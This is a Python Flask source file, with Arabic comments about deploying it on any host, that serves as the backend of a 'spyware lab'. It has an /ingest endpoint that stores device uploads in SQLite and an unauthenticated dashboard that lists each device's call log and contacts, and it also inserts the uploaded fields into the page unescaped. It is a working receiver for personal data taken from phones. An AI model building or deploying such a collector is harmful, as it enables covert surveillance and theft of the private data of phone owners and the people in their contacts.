from flask import Flask, request, jsonify
import sqlite3, time, json, os

app = Flask(__name__)

# مسار مطلق في نفس مجلد الملف — شغال على أي استضافة
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(BASE_DIR, "lab.db")

def init():
    con = sqlite3.connect(DB)
    con.execute("""CREATE TABLE IF NOT EXISTS uploads(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        payload TEXT,
        received_at REAL)""")
    con.commit()
    con.close()

# يشتغل أوتوماتيك عند الاستيراد (PythonAnywhere/gunicorn) وكمان عند التشغيل المباشر
init()

@app.route("/ingest", methods=["POST"])
def ingest():
    data = request.get_json(force=True, silent=True)
    if not data or "device_id" not in data:
        return jsonify(ok=False, error="bad payload"), 400
    con = sqlite3.connect(DB)
    con.execute("INSERT INTO uploads(device_id,payload,received_at) VALUES(?,?,?)",
                (str(data["device_id"]), json.dumps(data), time.time()))
    con.commit()
    con.close()
    return jsonify(ok=True)

@app.route("/")
def dashboard():
    con = sqlite3.connect(DB)
    rows = con.execute("SELECT device_id,payload,received_at FROM uploads ORDER BY id DESC").fetchall()
    con.close()
    cards = []
    for dev, payload, ts in rows:
        d = json.loads(payload)
        calls = "".join(
            f"<tr><td>{c.get('name') or chr(8212)}</td><td>{c.get('number')}</td>"
            f"<td>{c.get('type')}</td><td>{c.get('duration_sec')}s</td></tr>"
            for c in d.get("calls", [])[:50])
        contacts = "".join(
            f"<tr><td>{c.get('name')}</td><td>{c.get('number')}</td></tr>"
            for c in d.get("contacts", [])[:50])
        cards.append(f"""
        <h3>device {dev} — {time.strftime('%H:%M:%S', time.localtime(ts))}</h3>
        <p>{d.get('contacts_count')} contacts / {d.get('calls_count')} calls</p>
        <h4>call log</h4><table border=1 cellpadding=4>
        <tr><th>name</th><th>number</th><th>type</th><th>duration</th></tr>{calls}</table>
        <h4>contacts</h4><table border=1 cellpadding=4>
        <tr><th>name</th><th>number</th></tr>{contacts}</table><hr>""")
    return f"<h1>spyware lab — ingest dashboard</h1>{''.join(cards) or '<p>no uploads yet</p>'}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
